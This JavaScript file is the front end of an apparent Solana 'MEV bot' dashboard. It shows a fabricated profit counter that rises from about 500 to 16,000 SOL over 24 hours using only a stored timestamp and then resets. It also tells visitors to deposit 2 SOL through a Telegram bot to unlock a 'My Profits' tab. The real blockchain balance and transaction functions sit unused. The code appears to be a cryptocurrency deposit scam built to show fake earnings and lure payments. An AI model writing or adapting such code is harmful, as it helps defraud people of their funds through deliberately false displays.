document.addEventListener("DOMContentLoaded", function() {
    initializeWallet();
    showTab('wallet-tab');
});

function initializeWallet() {
    document.getElementById("wallet-address").textContent = "To get your wallet address, go to the Telegram bot and type /get_wallet";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
    document.getElementById("wallet-instructions").textContent = "Go to the Telegram bot, type /get_wallet and deposit 2 SOL to unlock the My Profits tab.";
    updateProfitsTab();
}

function updateProfitsTab() {
    const profitsContent = document.getElementById("profits-content");
    profitsContent.innerHTML = `
        <p>🔒 Deposit at least 2 SOL to your wallet to access this area.</p>
        <p>To get your wallet address and make a deposit:</p>
        <ol>
            <li>Go to the Telegram bot</li>
            <li>Type /get_wallet</li>
            <li>Follow the instructions to deposit 2 SOL</li>
        </ol>
    `;
}

function showTab(tabId) {
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.style.display = "none";
    }
    document.getElementById(tabId).style.display = "block";
}

const STORAGE_KEY = 'solana_mev_stats';

function getStoredStats() {
    const storedStats = localStorage.getItem(STORAGE_KEY);
    if (storedStats) {
        return JSON.parse(storedStats);
    }
    return initializeStats();
}

function initializeStats() {
    const stats = {
        startTime: new Date().toISOString(),
        lastKnownValue: 500.01
    };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(stats));
    return stats;
}

function calculateCurrentValue(stats) {
    const now = new Date();
    const startTime = new Date(stats.startTime);
    const elapsedSeconds = (now - startTime) / 1000;
    const maxStats = 16000.99;
    const totalSeconds = 24 * 60 * 60; // 24 hours in seconds
    const increment = (maxStats - 500.01) / totalSeconds;
    
    let currentValue = 500.01 + (increment * elapsedSeconds);
    
    if (currentValue >= maxStats || elapsedSeconds >= totalSeconds) {
        return initializeStats().lastKnownValue;
    }
    
    return currentValue;
}

function updateTodayStats() {
    const stats = getStoredStats();
    const currentValue = calculateCurrentValue(stats);
    document.getElementById("today-stats").textContent = `${currentValue.toFixed(2)} SOL`;
}

// The following functions are kept for future use when implementing actual wallet integration
async function fetchWalletBalance(walletAddress) {
    try {
        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [walletAddress]
            })
        });
        const data = await response.json();
        const balance = data.result.value / 1000000000; // Convert lamports to SOL
        document.getElementById("wallet-balance").textContent = `Balance: ${balance.toFixed(4)} SOL`;
    } catch (error) {
        console.error("Error fetching wallet balance:", error);
        document.getElementById("wallet-balance").textContent = "Error fetching balance";
    }
}

async function fetchTransactions(walletAddress) {
    try {
        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getSignaturesForAddress",
                "params": [
                    walletAddress,
                    { "limit": 10 }
                ]
            })
        });
        const data = await response.json();
        const transactions = data.result;

        const transactionsList = document.getElementById("transactions-list");
        transactionsList.innerHTML = "";

        for (let tx of transactions) {
            const txElement = document.createElement("div");
            txElement.className = "transaction";
            txElement.innerHTML = `
                <div class="transaction-signature">${tx.signature.substr(0, 20)}...</div>
                <div class="transaction-slot">Slot: ${tx.slot}</div>
                <div class="transaction-time">${new Date(tx.blockTime * 1000).toLocaleString()}</div>
            `;
            transactionsList.appendChild(txElement);
        }
    } catch (error) {
        console.error("Error fetching transactions:", error);
        document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
    }
}

// Update today's stats every 30 seconds (for future use)
setInterval(() => {
    updateTodayStats();
}, 30000);